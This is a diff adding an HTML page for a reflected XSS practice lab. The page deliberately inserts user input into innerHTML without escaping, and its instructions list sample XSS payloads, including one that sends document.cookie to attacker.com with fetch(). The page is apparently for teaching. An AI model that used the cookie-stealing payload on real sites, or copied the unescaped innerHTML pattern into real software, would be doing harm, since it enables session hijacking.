@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Reflected XSS Lab</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(45deg, #ff9a9e, #fad0c4, #fad0c4, #a18cd1, #fbc2eb, #a6c0fe);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.85);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 8px 16px rgba(0,0,0,0.3);
+            text-align: center;
+            max-width: 600px;
+            width: 90%;
+        }
+
+        h1 {
+            margin-bottom: 20px;
+            color: #333;
+            animation: colorChange 5s infinite;
+        }
+
+        @keyframes colorChange {
+            0% { color: #ff0000; }
+            25% { color: #ff7f00; }
+            50% { color: #ffff00; }
+            75% { color: #00ff00; }
+            100% { color: #0000ff; }
+        }
+
+        textarea {
+            width: 100%;
+            height: 150px;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 2px solid #ccc;
+            border-radius: 8px;
+            resize: none;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        textarea:focus {
+            border-color: #007BFF;
+            outline: none;
+        }
+
+        button {
+            padding: 10px 20px;
+            border: none;
+            background-color: #007BFF;
+            color: #fff;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        .output {
+            margin-top: 20px;
+            padding: 15px;
+            border: 2px dashed #ccc;
+            background-color: #f9f9f9;
+            border-radius: 8px;
+            min-height: 50px;
+            word-wrap: break-word;
+            animation: borderPulse 2s infinite;
+        }
+
+        @keyframes borderPulse {
+            0% { border-color: #ff0000; }
+            50% { border-color: #0000ff; }
+            100% { border-color: #ff0000; }
+        }
+
+        .alert {
+            color: #721c24;
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Reflected XSS Lab</h1>
+        <form id="xssForm">
+            <textarea id="payload" placeholder="Enter your XSS payload here..."></textarea><br>
+            <button type="submit">Submit</button>
+        </form>
+
+        <div class="output" id="output"></div>
+
+        <div class="instructions">
+            <h2>Instructions</h2>
+            <p>To test for reflected XSS, enter the following payloads into the input field:</p>
+            <ul>
+                <li><strong>Basic Alert:</strong> <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
+                <li><strong>Image Payload:</strong> <code>&lt;img src="x" onerror="alert('XSS')"&gt;</code></li>
+                <li><strong>Event Handler:</strong> <code>&lt;input type="text" onfocus="alert('XSS')" autofocus&gt;</code></li>
+                <li><strong>Stealing Cookies:</strong> <code>&lt;script&gt;fetch('https://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;</code></li>
+            </ul>
+            <p><strong>Note:</strong> The payloads above are for demonstration purposes. Always ensure that you have permission to test for vulnerabilities on any system.</p>
+        </div>
+    </div>
+
+    <script>
+        // Get the form and output elements
+        const form = document.getElementById('xssForm');
+        const outputDiv = document.getElementById('output');
+        const payloadInput = document.getElementById('payload');
+
+        // Handle form submission
+        form.addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent page reload
+
+            // Get the user input
+            const payload = payloadInput.value;
+
+            // Reflect the input in the output div
+            // Note: This is where the XSS vulnerability is simulated
+            outputDiv.innerHTML = `<h2>Hello, ${payload}!</h2>`;
+        });
+    </script>
+</body>
+</html>
